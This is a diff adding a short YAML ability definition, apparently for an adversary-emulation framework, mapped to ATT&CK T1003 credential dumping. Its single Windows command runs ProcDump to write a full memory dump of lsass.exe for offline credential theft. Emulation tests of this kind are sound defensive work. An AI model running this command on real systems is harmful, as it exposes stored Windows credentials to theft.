@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1003-AR04-1v00-200120190844
+  name: Dump LSASS.exe Memory using ProcDump
+  description: .      The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals.      ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
+  tactic: multiple
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      cmd:
+        command: |
+          C:/adrestia/adrestia/resources/tools/procdump/procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
